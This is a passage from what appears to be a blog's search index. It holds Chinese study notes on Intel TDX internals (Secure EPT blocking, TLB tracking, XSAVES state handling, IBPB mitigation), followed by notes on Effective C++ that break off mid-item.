tdcs_ptr-&gt;epoch_tracking.epoch_and_refcount.td_epoch</p>\n<p>这里的条件是</p>\n<ol>\n<li>td_epoch 比之前 block 的时候大 1 那这轮 flush 必须都完成</li>\n<li>td_epoch 比之前 block 的时候不止大 1 那表示之前的 flush 已经完成</li>\n</ol>\n<p>remove 改 pte 必须先 block-&gt;block 后必须 track-&gt;track 必须 flush</p>\n<p><img src=\"/images/OiaUbKFGfoYRvVxEqWgc2XwpnYd.png\" title=\"image\"></p>\n<p>KVM 如果不发 IPI vCPU 不下来  在 remove 的时候 根据 refcount 还是可以判断最近一次的同步有没有完成</p>\n<p>refcount 在每次 enter 的时候 +1 exit 的时候-1 动态变化 只有所有 vCPU 都没 enter 的时候才会是 0</p>\n<h4 id=\"TDH-MEM-RANGE-BLOCK\"><a href=\"#TDH-MEM-RANGE-BLOCK\" class=\"headerlink\" title=\"TDH.MEM.RANGE.BLOCK\"></a>TDH.MEM.RANGE.BLOCK</h4><blockquote>\n<p>Execute TDH.MEM.RANGE.BLOCK on each GPA range, blocking subsequent creation of TLB translation to that range.<br>Note that cached translations may still exist at this stage.</p>\n</blockquote>\n<blockquote>\n<p>The host VMM can remove a Secure EPT page using TDH.MEM.SEPT.REMOVE, freeing it for any use, provided all its 35 entries are FREE. The host VMM should first perform the TLB tracking protocol on the page.<br>The host VMM should first call TDH.MEM.RANGE.BLOCK on the Secure EPT page. TDH.MEM.RANGE.BLOCK marks the parent EPT entry for that page as **BLOCKED **and records the TD epoch in the PAMT entry of the page.</p>\n<p>Typically, the host VMM then calls TDH.MEM.TRACK and performs a round of IPIs. After that, there should be no active address translation to GPA range presented by the Secure EPT page to be removed.</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Prepare the EPT entry value with TDB set, RWX cleared and suppress VE set</span></span><br><span class=\"line\">    <span class=\"type\">ia32e_sept_t</span> new_septe_val;</span><br><span class=\"line\">    new_septe_val.raw = page_sept_entry_copy.raw;</span><br><span class=\"line\"></span><br><span class=\"line\">    block_sept_entry(&amp;new_septe_val, sept_level_and_gpa.level);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// Update the SEPT entry in memory</span></span><br><span class=\"line\">    atomic_mem_write_64b(&amp;page_sept_entry_ptr-&gt;raw, new_septe_val.raw);</span><br></pre></td></tr></table></figure>\n\n<p>一个新的 pte 改了属性  atomic write 修改到页表上？ 硬件有特殊的行为吗？</p>\n<p>9.2 Secure EPT Entry</p>\n<blockquote>\n<p>From the CPU perspective, Secure EPT has the same structure as a legacy VMX EPT.<br>For the purpose of private memory management, the Intel TDX module hold a state value in each Secure EPT entry. This state value is encoded by multiple bits.</p>\n</blockquote>\n<p><img src=\"/images/BsCQbP6eno1j48x2g3YcmObEneg.png\" title=\"image\"></p>\n<h4 id=\"Sum-1\"><a href=\"#Sum-1\" class=\"headerlink\" title=\"Sum\"></a>Sum</h4><ol>\n<li>先改页表 block  不让访问 （但是其他 vCPU 还是可以通过 tlb 访问 没问题 因为还没有到 remove 的流程）</li>\n<li>刷 tlb ipi</li>\n<li>改页表 remove  此时需要保证之前的刷 tlb 完成</li>\n</ol>\n<h3 id=\"Associate-vcpu\"><a href=\"#Associate-vcpu\" class=\"headerlink\" title=\"Associate vcpu\"></a>Associate vcpu</h3><p>10.3</p>\n<blockquote>\n<p>Some TD VCPU state is non-coherently cached. This includes:<br>• Address translations (TLB&#x2F;PxE entries) must be explicitly flushed in case they may be stale.<br>• TD VMCS is cached by the CPU. VMX architecture requires making a VMCS current by VMPTRLD before using it with most VMX instructions, and then explicitly writing it to memory and making it non-current by VMCLEAR before the VMCS memory image can be handled (e.g., by making it current on another LP).<br>This non-coherent caching implies that some explicit and&#x2F;or implicit operations are done to help guarantee correctness. This is described in the following sections</p>\n</blockquote>\n<p>tdvps_ptr-&gt;management.assoc_lpid</p>\n<p>就是刷缓存的时候用(主要是第二条)</p>\n<ol>\n<li>每次 vpenter adjust_tlb_tracking_state 如果不是 new_association  flushasid invalidate gpa translations</li>\n<li>tdh_vp_flush 当前的 lpid 必须和传入的 tdvps 记录的 lpid 一致</li>\n</ol>\n<p>kvm 有 tdx_flush_vp_on_cpu  当每次 tdx_vcpu_load 的时候 当前 cpu 和记录的 cpu 不一致的时候调用(Migrate VCPUs between LPs)</p>\n<h3 id=\"Xmm\"><a href=\"#Xmm\" class=\"headerlink\" title=\"Xmm\"></a>Xmm</h3><p>tdcall 的时候 根据传入的 xmm_mask 选择保存并传递 其他全部清零</p>\n<p>async 的时候 xsave</p>\n<blockquote>\n<p>The Intel TDX module helps ensure that any guest TD extended state is saved and isolated from the host VMM across TD exit and entry. It is the VMM’s responsibility to save its own extended state across TD entry and exit.<br>• Before TDH.VP.ENTER, the host VMM should save (e.g., using XSAVES) any extended state that the guest TD VCPU is allowed to use (per XFAM) and the host VMM expects to need after TDH.VP.ENTER is complete.<br>• The TDH.VP.ENTER function loads the extended state that the TD VCPU is allowed to use, per XFAM, from the VCPU’s TDVPS. An exception to this is when TDH.VP.ENTER follows a previous TDG.VP.VMCALL – in the case TDH.VP.ENTER does not load the XMM state (corresponding to XFAM bit 1) from TDVPS; it passes it directly from the host VMM.<br>• On an asynchronous TD exit, the Intel TDX module saves the extended state that the TD VCPU was allowed to use, per XFAM, to the VCPU’s TDVPS. It then clears the extended state.<br>• On TDG.VP.VMCALL, the Intel TDX module works similarly, but it selectively does not clear some of the XMM register<br>state (corresponding to XFAM bit 1). That XMM state is passed directly to the host VMM.<br>• On completion of TDH.VP.ENTER (following TD exit), the VMM may restore any extended state that it saved before<br>TDH.VP.ENTER.</p>\n</blockquote>\n<p>xfam：eXtended Features Available Mask   决定 guest vCPU 能用哪些属性 然后保存恢复的时候直接把这个传进去</p>\n<p>kvm 配置</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">save_guest_td_extended_state</span><span class=\"params\">(<span class=\"type\">tdvps_t</span>* tdvps_ptr, <span class=\"type\">uint64_t</span> xfam)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// Set Guest XCR0 and XSS context for saving the state</span></span><br><span class=\"line\">    ia32_xsetbv(<span class=\"number\">0</span>, xfam &amp; XCR0_USER_BIT_MASK);</span><br><span class=\"line\">    ia32_wrmsr(IA32_XSS_MSR_ADDR, xfam &amp; XCR0_SUPERVISOR_BIT_MASK);</span><br><span class=\"line\"></span><br><span class=\"line\">    ia32_xsaves(&amp;tdvps_ptr-&gt;guest_extension_state.xbuf, xfam);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">restore_guest_td_extended_state</span><span class=\"params\">(<span class=\"type\">tdcs_t</span>* tdcs_ptr, <span class=\"type\">tdvps_t</span>* tdvps_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> xstate_bv = tdvps_ptr-&gt;guest_extension_state.xbuf.xsave_header.xstate_bv;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> xcomp_bv = tdvps_ptr-&gt;guest_extension_state.xbuf.xsave_header.xcomp_bv;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check for XBUFF header corruption before trying to use SAFE_XRSTORS</span></span><br><span class=\"line\">    <span class=\"comment\">// Checks are done according to SDM Volume 1, Chapter 13.12</span></span><br><span class=\"line\">    <span class=\"comment\">// A #GP occurs in the following cases:</span></span><br><span class=\"line\">    <span class=\"comment\">//  - XCOMP_BV[63] = 0.</span></span><br><span class=\"line\">    <span class=\"comment\">//  - XCOMP_BV sets a bit in the range 62:0 that is not set in XCR0 | IA32_XSS</span></span><br><span class=\"line\">    <span class=\"comment\">//    (in our case XCR0 | IA32_XSS is just the XFAM)</span></span><br><span class=\"line\">    <span class=\"comment\">//  - XSTATE_BV sets a bit(including bit 63) that is not set in XCOMP_BV.</span></span><br><span class=\"line\">    <span class=\"comment\">//  - Bytes 63 : 16 of the XSAVE header are not all 0.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (((xcomp_bv &amp; BIT(<span class=\"number\">63</span>)) == <span class=\"number\">0</span>) ||</span><br><span class=\"line\">        ((xcomp_bv &amp; ~BIT(<span class=\"number\">63</span>) &amp; ~(tdvps_ptr-&gt;management.xfam)) != <span class=\"number\">0</span>) ||</span><br><span class=\"line\">        ((xstate_bv &amp; ~xcomp_bv) != <span class=\"number\">0</span>) ||</span><br><span class=\"line\">        (!tdx_memcmp_to_zero(tdvps_ptr-&gt;guest_extension_state.xbuf.xsave_header.reserved,</span><br><span class=\"line\">                             <span class=\"keyword\">sizeof</span>(tdvps_ptr-&gt;guest_extension_state.xbuf.xsave_header.reserved))))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed checks on XBUFF header. xcomp_bv = 0x%llx, xstate_bv = 0x%llx, xfam = 0x%llx\\n&quot;</span>,</span><br><span class=\"line\">                xcomp_bv, xstate_bv, tdvps_ptr-&gt;management.xfam);</span><br><span class=\"line\">        guest_ext_state_load_failure(tdcs_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set Guest XCR0 and XSS context for restoring the state</span></span><br><span class=\"line\">    ia32_xsetbv(<span class=\"number\">0</span>, tdvps_ptr-&gt;management.xfam &amp; XCR0_USER_BIT_MASK);</span><br><span class=\"line\">    ia32_wrmsr(IA32_XSS_MSR_ADDR, tdvps_ptr-&gt;management.xfam &amp; XCR0_SUPERVISOR_BIT_MASK);</span><br><span class=\"line\"></span><br><span class=\"line\">    safe_xrstors(&amp;tdvps_ptr-&gt;guest_extension_state.xbuf, tdvps_ptr-&gt;management.xfam, tdcs_ptr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.felixcloutier.com/x86/xsave\">https://www.felixcloutier.com/x86/xsave</a></p>\n<p><a href=\"https://www.felixcloutier.com/x86/xrstor\">https://www.felixcloutier.com/x86/xrstor</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>  fcw;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>  fsw;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>   ftw;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>   reserved_0;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>  fop;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>  fip;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>  fdp;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>  mxcsr;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>  mxcsr_mask;</span><br><span class=\"line\">    <span class=\"type\">uint128_t</span> st_mm[<span class=\"number\">8</span>];</span><br><span class=\"line\">    <span class=\"type\">uint128_t</span> xmm[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>   reserved_1[<span class=\"number\">96</span>];</span><br><span class=\"line\">&#125; <span class=\"type\">xsave_legacy_region_t</span>;</span><br><span class=\"line\">tdx_static_assert(<span class=\"keyword\">sizeof</span>(<span class=\"type\">xsave_legacy_region_t</span>) == <span class=\"number\">512</span>, <span class=\"type\">xsave_legacy_region_t</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/T2FwbKKOToNlUgxsOeickQpdnrg.png\" title=\"image\"></p>\n<p>xfam 是 instruction mask  实际上叫 eXtended Features Available Mask</p>\n<p>Section 13.4.1, “Legacy Region of an XSAVE Area” of Intel(® )64 and IA-32 Architectures Software Developer’s Manual, Volume 1</p>\n<p>和 XCR0 and 以后称为 requested-feature bitmap (RFBM)  可以理解为需不需要保存对应的 state-component</p>\n<p>13.11 XSAVES</p>\n<blockquote>\n<p>Execution of XSAVES saves into the XSAVE area those state components corresponding to bits that are set in RFBM (subject to the optimizations described below). State components 0 and 1 are located in the legacy region of the XSAVE area (see Section 13.4.1). Each state component <em>i</em>, 2 ≤ _i _≤ 62, is located in the extended region; the XSAVES instruction always uses the compacted format for the extended region (see Section 13.4.3).<br>Execution of XSAVES performs the init optimization to reduce the amount of data written to memory. If XINUSE[<em>i</em>] &#x3D; 0, state component _i _is not saved to the XSAVE area (even if RFBM[<em>i</em>] &#x3D; 1). However, if RFBM[1] &#x3D; 1 and MXCSR does not have the value 1F80H, XSAVES saves all of state component 1 (SSE — including the XMM registers) even if XINUSE[1] &#x3D; 0.</p>\n</blockquote>\n<p>有优化</p>\n<ul>\n<li>在初始化状态下是不会保存（0）</li>\n<li>最近才恢复的就不用保存（没修改）</li>\n</ul>\n<p>每次 XRSTORS 会记录一个四元组信息  XSAVES 检查这个四元组 满足条件就不保存</p>\n<ol>\n<li>特权级是 ring0</li>\n<li>xsave area 地址一样</li>\n<li>如果 XRSTORS 调用时是 VMX non-root 那 XSAVES 调用也必须是 VMX non-root</li>\n<li>对应的 state-component 没有被修改</li>\n</ol>\n<p>第一个优化：host guest 是否会用完 xmm 就清零？ 发生 hypercall 的时候除了需要传递的 xmm 其他都是清零的</p>\n<p>第二个优化：两次 vmexit 之间  guest&#x2F;host 不会执行其他的 xrstors</p>\n<blockquote>\n<p>The XSAVEOPT, XSAVEC, and XSAVES instructions use two optimizations to reduce the amount of data that they write to memory. They avoid writing data for any state component known to be in its initial configuration (the <strong>init optimization</strong>). In addition, if either XSAVEOPT or XSAVES is using the same XSAVE area as that used by the most recent execution of XRSTOR or XRSTORS, it may avoid writing data for any state component whose configuration is known not to have been modified since then (the <strong>modified optimization</strong>). (XSAVE does not use these optimizations, and XSAVEC does not use the modified optimization.) The operation of XSAVEOPT, XSAVEC, and XSAVES are described in more detail in Section 13.9 through Section 13.11.<br>• **SSE state. **In 64-bit mode, SSE state is in its initial configuration if each of XMM0–XMM15 is 0. Outside 64-bit mode, SSE state is in its initial configuration if each of XMM0–XMM7 is 0. XINUSE[1] pertains only to the state of the XMM registers and not to MXCSR. An execution of XRSTOR or XRSTORS outside 64-bit mode does not update XMM8–XMM15. (See Section 13.13.)<br>• **AVX state. **In 64-bit mode, AVX state is in its initial configuration if each of YMM0_H–YMM15_H is 0. Outside 64-bit mode, AVX state is in its initial configuration if each of YMM0_H–YMM7_H is 0. An execution of XRSTOR or XRSTORS outside 64-bit mode does not update YMM8_H–YMM15_H. (See Section 13.13.)</p>\n</blockquote>\n<blockquote>\n<p>Like XSAVEOPT, XSAVES may perform the modified optimization. Each execution of XRSTOR and XRSTORS establishes XRSTOR_INFO as a 4-tuple <em>w</em>,<em>x</em>,<em>y</em>,_z_ (see Section 13.8.3 and Section 13.12). Execution of XSAVES uses the modified optimization only if the following all hold:</p>\n<p>• _w _&#x3D; CPL;<br>• _x _&#x3D; 1 if and only if the logical processor is in VMX non-root operation;<br>• _y _is the linear address of the XSAVE area being used by XSAVEOPT; and<br>• <em>z</em>[63] is 1 and <em>z</em>[62:0] &#x3D; RFBM[62:0]. (This last item implies that XSAVES does not use the modified optimization if the last execution of XRSTOR used the standard form and followed the last execution of XRSTORS.)<br>If XSAVES uses the modified optimization and XMODIFIED[<em>i</em>] &#x3D; 0 (see Section 13.6), state component _i _is not saved to the XSAVE area.</p>\n</blockquote>\n<h3 id=\"Branch-prediction\"><a href=\"#Branch-prediction\" class=\"headerlink\" title=\"Branch prediction\"></a>Branch prediction</h3><p>是个 side-channel</p>\n<blockquote>\n<p>Branch predictions cached by the CPU before entering a guest TD should not impact the behavior of that TD. The Intel TDX module helps ensure that by applying CPU mechanisms to isolate the branch predictions of each guest TD from branch predication done outside its execution.</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// If the current VCPU to be executed on this LP is not the same as the last one,</span></span><br><span class=\"line\">    <span class=\"comment\">// issue an indirect branch prediction barrier (IBPB) command</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvpr_pa.raw != local_data_ptr-&gt;vp_ctx.last_tdvpr_pa.raw)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// The TD ASID (Address Space Identifier) does not distinguish between different VCPUs of the same TD.</span></span><br><span class=\"line\">        <span class=\"comment\">// Therefore, when switching VCPU of the same TD on the same LP we should invalidate EPT.</span></span><br><span class=\"line\">        <span class=\"comment\">// Practically, we do this on every VCPU switch (even not of the same TD).</span></span><br><span class=\"line\">        <span class=\"comment\">// This is because it is difficult to track the history of TD execution on an LP</span></span><br><span class=\"line\">        <span class=\"comment\">// (i.e., we should check for every TD/VCPU combination in the past).</span></span><br><span class=\"line\">        flush_all_td_asids(tdr_ptr, tdcs_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Issue an indirect branch prediction barrier (IBPB) command, since the CPU does not</span></span><br><span class=\"line\">        <span class=\"comment\">// distinguish between VCPUs for its branch prediction.</span></span><br><span class=\"line\">        <span class=\"type\">ia32_pred_cmd_t</span> pred_cmd = &#123; .raw = <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">        pred_cmd.ibpb = <span class=\"number\">1</span>;</span><br><span class=\"line\">        ia32_wrmsr(IA32_PRED_CMD_MSR_ADDR, pred_cmd.raw);</span><br><span class=\"line\">        local_data_ptr-&gt;vp_ctx.last_tdvpr_pa.raw = tdvpr_pa.raw;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.intel.cn/content/www/cn/zh/developer/articles/technical/software-security-guidance/technical-documentation/indirect-branch-predictor-barrier.html\">https://www.intel.cn/content/www/cn/zh/developer/articles/technical/software-security-guidance/technical-documentation/indirect-branch-predictor-barrier.html</a></p>\n<p>用 barrier 防御 tdx module 在 host-guest 间做 barrier</p>\n<p>guest 也可以写这个 msr kvm 配置是否需要下陷</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (boot_cpu_has(X86_FEATURE_IBPB))</span><br><span class=\"line\">        vmx_set_intercept_for_msr(vcpu, MSR_IA32_PRED_CMD, MSR_TYPE_W,</span><br><span class=\"line\">                                  !guest_has_pred_cmd_msr(vcpu));</span><br></pre></td></tr></table></figure>\n\n<p>guest 为了安全 可以每次进 guest(embassy)自己做一遍 IBPB</p>\n<p>为了性能 host 允许 non-root mode 直接执行 不下陷</p>\n<h2 id=\"Sev\"><a href=\"#Sev\" class=\"headerlink\" title=\"Sev\"></a>Sev</h2><p><a href=\"https://github.com/amd/AMD-ASPFW\">https://github.com/amd/AMD-ASPFW</a> 找不到 vmexit 相关 只有 kvm 调 cmd 的部分</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">sev_issue_cmd</span><br><span class=\"line\">sev_issue_cmd_external_user</span><br><span class=\"line\">sev_do_cmd</span><br><span class=\"line\">__sev_do_cmd_locked</span><br><span class=\"line\">    reg = cmd;</span><br><span class=\"line\">    iowrite32(ret,..);</span><br><span class=\"line\">    </span><br><span class=\"line\">    ret = sev_wait_cmd_ioc();</span><br></pre></td></tr></table></figure>\n","categories":["papers"]},{"title":"Effective C++","url":"/2026/01/31/cpp/effectiveC++/","content":"<h1 id=\"Effective-C\"><a href=\"#Effective-C\" class=\"headerlink\" title=\"Effective C++\"></a>Effective C++</h1><h2 id=\"让自己习惯C\"><a href=\"#让自己习惯C\" class=\"headerlink\" title=\"让自己习惯C++\"></a>让自己习惯C++</h2><ol>\n<li><ol>\n<li>c++有4个主要的次语言</li>\n</ol>\n<ul>\n<li>C 没有模板 异常 重载</li>\n<li>C++ 类 封装 继承 多态 虚函数</li>\n<li>Template 泛型</li>\n<li>STL</li>\n</ul>\n<p>不同次语言有不同的规约，需要使用不同的处理方式（例如传值和传引用的效率）</p>\n</li>\n<li><p>#define 直接被替换 报错时找不到信息 并且占用内存可能反而更大</p>\n<ul>\n<li>const 取地址合法</li>\n<li>enum 取地址不合法</li>\n<li>inline</li>\n</ul>\n</li>\n<li><p>用const修饰变量，函数等</p>\n<p>返回的对象可以使用const修饰 避免 <code>if(a*b=c)</code></p>\n<p>const可非const可重载</p>\n<p>非const可转型为const</p>\n</li>\n<li><p>类的成员变量的初始化发生在进入构造函数之前，且一定按声明的顺序</p>\n<p>使用初始化列表，内置类型也使用xx()的形式</p>\n</li>\n</ol>\n<h2 id=\"构造-析构-赋值运算\"><a href=\"#构造-析构-赋值运算\" class=\"headerlink\" title=\"构造&#x2F;析构&#x2F;赋值运算\"></a>构造&#x2F;析构&#x2F;赋值运算</h2><ol start=\"5\">\n<li><p>默认构造函数会初始化基类和非静态成员变量，默认析构会自动调用析构（所以不用写），默认拷贝函数会复制每个非const对象</p>\n<p>三种情况 不会生成默认拷贝函数</p>\n<ul>\n<li>有引用成员变量</li>\n<li>有const成员变量</li>\n<li>基类的拷贝函数为private</li>\n</ul>\n</li>\n<li><p>不想使用默认的函数，可以声明为private</p>\n</li>\n<li><p>多态的基类的析构函数加virtual 避免用基类指针释放派生类对象出现内存泄漏</p>\n<p>虚函数使用虚函数指针管理，会增加内存占用</p>\n<p>如果基类的析构没有virtual 不适合派生，例如STL</p>\n</li>\n<li><p>在析构中catch异常，不向下传递</p>\n</li>\n<li><p>在派生类的构造&#x2F;析构函数调用基类的构造&#x2F;析构函数时，派生类的信息已经消失，所以在基类的构造&#x2F;析构函数中调用虚函数是无效的</p>\n</li>\n<li><p>为了实现连续赋值，让operator&#x3D;返回左值引用</p>\n</li>\n<li><p>operator&#x3D;的两个对象如果相同可能会出现删掉自己的问题 </p>\n<p>解决方法如下：</p>\n<ul>\n<li>开头判断是否相等 如果相等直接返回    增加了取址 条件跳转 影响效率</li>\n<li>调整顺序 先改再删 </li>\n<li>用swap</li>\n</ul>\n</li>\n<li><p>自定义拷贝构造函数和拷贝函数需要保证复制了每个成员变量，编译器不会提醒</p>\n<ul>\n<li>复制自己所有的成员变量</li>\n<li>调用基类的拷贝构造函数 <code>XX::operator=(rhs)</code></li>\n</ul>\n<p>拷贝构造函数和拷贝函数重复的代码可用一个private的init函数来写</p>\n</li>\n</ol>\n<h2 id=\"资源管理\"><a href=\"#资源管理\" class=\"headerlink\" title=\"资源管理\"></a>资源管理</h2><p>除了内存，文件描述符，锁、连接、socket都是资源</p>\n<ol start=\"13\">\n<li><p>在一个函数中，使用指针 最后delete 可能导致由于中间部分的问题而没有delete</p>\n<p>使用智能指针管理，借助离开函数自动调用析构函数的机制 <code>std::auto_ptr&lt;A&gt; p(new A)</code></p>\n<p>智能指针默认执行delete 而不是delete[] 无法管理数组</p>\n<p>需要open close成对出现的资源 可以写在一个类中，close写在类的析构中，出现异常自动调用</p>\n</li>\n<li><p>资源管理类小心复制，可以直接禁止复制</p>\n</li>\n<li><p>虽然智能指针可以通过*或-&gt;像指针一样使用，但是<code>*A</code>与<code>std::auto_ptr&lt;A&gt;</code>类型并不相同，不能被函数接受</p>\n<p>智能指针提供get方法拿到原始指针，但是这样用户会觉得麻烦</p>\n<p>另一种方法是在类中定义隐式转换的函数 但这样会出现非预期的转换 造成bug</p>\n</li>\n<li><p>new delete ； new[]  delete[]  否则都会有bug</p>\n<ul>\n<li>多个构造函数用相同形式的new</li>\n<li>使用typedef 注意是否是数组</li>\n</ul>\n</li>\n<li><p>new得到的指针放入指针智能时使用独立语句，否则可能导致中间步骤的失败丢失new出来的指针</p>\n</li>\n</ol>\n<h2 id=\"设计与声明\"><a href=\"#设计与声明\" class=\"headerlink\" title=\"设计与声明\"></a>设计与声明</h2><ol start=\"18\">\n<li><p>良好的接口不应该被误用，例如返回指针会导致没有delete&#x2F;delete两次&#x2F;错误方式delete等</p>\n<p>可以返回一个智能指针，同时设置好deleter 强制让用户使用智能指针来接受</p>\n<p>防止同类型的参数顺序出错，可以新声明几个类型，强制让用户使用新类型</p>\n</li>\n<li><p>设计class应该像设计type一样 考虑创建销毁 初始化赋值 传递 合法值 转换 操作符 接口等一系列问题</p>\n</li>\n<li><p>函数参数传递是按值传递，会调用构造函数，效率低，尽量使用引用传递，为了防止引用传递的后果 加const</p>\n<p>这样做可以解决对象切割的问题，即使用基类对象接受派生类，依然可以正确找到派生类声明为virtual的函数</p>\n<p>内置类型比较小 用引用涉及到指针反而慢， stl容器也尽量用值传递</p>\n</li>\n<li><p>函数的返回值也会涉及到构造与析构的浪费，但是此处并没有办法节省（除非返回值并不是函数生成的）</p>\n<p>尝试方法与问题如下：</p>\n<ul>\n<li>栈上分配 返回引用   返回时已经销毁 拿到已经销毁的变量</li>\n<li>堆上分配 返回指针   没人delete&#x2F;连续运算时丢失临时变量的指针</li>\n<li>使用static     static对象只看现值 严重bug</li>\n</ul>\n</li>\n<li><p>所有类的成员变量都应该是private 需要的话设置getter和setter通过函数访问</p>\n<p>好处如下：</p>\n<ul>\n<li>提供的接口都是函数，统一使用括号访问</li>\n<li>封装 可以随意修改实现方法</li>\n<li>取消此变量后不会让客户代码与派生类代码发生破坏</li>\n</ul>\n</li>\n<li><p>封装的内容越多，可访问内容的函数越少，改动影响的部分越少，可改动的弹性越大</p>\n<p>所以在两个函数具有相同功能的时候，尽量使用non-member&#x2F;non-friend去替代member(成员)函数</p>\n<p>可以使用namespace把工具函数和类放在同一区域中</p>\n<p>不同的源文件不能切分类，但是可以使用同一个namespace 切分工具函数</p>\n</li>\n<li><p>如果一个函数的所有参数都需要类型转换，应该成为non-member</p>\n<p>member函数一方是this 无法隐式转换</p>\n</li>\n<li><p>？ swap</p>\n</li>\n</ol>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><ol start=\"26\">\n<li><p>尽量延后变量定义式出现的时间，否则可能会由于中途的异常而没有使用却承担了构造析构的成本</p>\n<p>直接给初值，而不是初始化之后再赋值</p>\n<p>循环中需要的变量放在内还是外需要对比构造析构与赋值操作的时间，放内部不影响作用域及可理解性、易维护性</p>\n</li>\n<li><p>少转型 用新式转型替代旧式转型</p>\n<p>转型不是只改变解释方式不改变数据，转型会生成代码（int和double的表示方式都不同）</p>\n<ul>\n<li>static_cast  强迫转型 但是在类的成员函数中转成基类调基类的函数会导致生成函数副本，使用错误的this</li>\n<li>dynamic_cast 向下转型，可以通过基类派生类，但是效率不高，最好用virtual实现相同的功能</li>\n</ul>\n</li>\n<li><p>避免返回handles（引用，指针，迭代器）</p>\n<p>风险如下：</p>\n<ul>\n<li>操作了private成员&#x2F;声明为const的函数&#x2F;变量实际修改了内容</li>\n<li>handles所指内容的主体已经被析构，造成空悬</li>\n</ul>\n<p>例外：string vector等容器的operator&#x3D;返回的是引用</p>\n</li>\n<li><p>函数需要异常安全</p>\n<p>三个等级：</p>\n<ul>\n<li>基本：不破坏数据结构（例如资源泄露，打乱排序数组）</li>\n<li>强烈：保证状态不变 可以通过copy-swap实现，及创建副本 修改在副本上 然后交换 但可能效率较低 复杂程度较高；并且，如果这个函数中调用了其他函数，但是其他函数并没有强烈的异常安全保证，自己也不行。</li>\n<li>不抛异常</li>\n</ul>\n</li>\n<li><p>inline 用函数本体替换每次调用的地方，编译时候完成，编译器会选择（太复杂或者virtual会拒绝）</p>\n<ul>\n<li><p>好处：减小函数调用的开销</p>\n</li>\n<li><p>坏处：可能增大字节码，修改后必须重新编译</p>\n</li>\n</ul>\n</li>\n<li><p>？传统的方式（.h&#x2F;.cpp）并没有编译依存最小化，仅仅修改一部分就需要全部编译</p>\n<p>可通过以下两种方式解耦接口与实现：</p>\n<ul>\n<li>handle classes：通过组合方式，类A使用类AImpl完全其所有的函数</li>\n<li>interface classes：通过继承方式，类A提供接口，全是纯虚函数，类B继承类A实现这些函数。</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"继承与面向对象设计\"><a href=\"#继承与面向对象设计\" class=\"headerlink\" title=\"继承与面向对象设计\"></a>继承与面向对象设计</h2><ol start=\"32\">\n<li><p>public继承必须满足is-a的关系（里氏替换原则）</p>\n</li>\n<li><p>派生类函数会遮蔽基类的函数，具体情况为基类有多个重载的函数，派生类有一个同名的函数，那么基类的多个函数全被遮蔽（与virtual无关），如果是public继承则违反了is-a的关系 </p>\n<p>解决方法是使用<code>using Base::f</code> 但这样会把所有的重载的f都拿到作用域中</p>\n<p>如果只想用某一个，可以先用private继承，然后在同名函数中直接调用<code>Base::f()</code></p>\n</li>\n<li><p>区分接口继承和实现继承</p>\n<p>用virtual 同时继承接口和实现，可以重写各自的实现，但问题是如果忘记重写了编译器并不会报错，而是会使用基类的函数</p>\n<p>用pure virtual 可以强制让派生类提供实现，但是可能会出现相同代码</p>\n<p>在基类中提供一个default版本的代码供派生类调用，但这样会多一个函数，且造成命名混乱</p>\n<p>解决方法：给纯虚函数提供实现，派生类通过<code>Base::f()</code>调用此函数</p>\n</li>\n<li><p>？设计模式   替代virtual</p>\n<p>private  virtual&#x2F;public non-virtual调用virtual</p>\n</li>\n<li><p>non-virtual函数不应该被重新定义</p>\n</li>\n<li><p>函数参数的缺省值是看静态类型的，所以virtual函数的参数缺省值只有基类起作用</p>\n</li>\n<li><p>复合  has-a</p>\n</li>\n<li><p>？private继承</p>\n<p>private继承得到的接口都是private 